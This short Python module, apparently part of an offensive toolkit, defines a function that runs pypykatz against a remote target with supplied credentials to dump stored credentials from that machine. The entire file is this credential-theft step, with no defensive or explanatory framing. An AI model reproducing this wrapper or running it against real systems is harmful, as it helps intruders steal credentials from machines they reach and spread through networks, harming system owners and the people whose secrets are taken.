# modules/pypykatz.py
from utils import run_cmd

def extract_creds(target, user, pwd):
    cmd = ["pypykatz", "livedump", "--target", target, "--cred", f"{user}:{pwd}"]
    out = run_cmd(cmd)
    return out
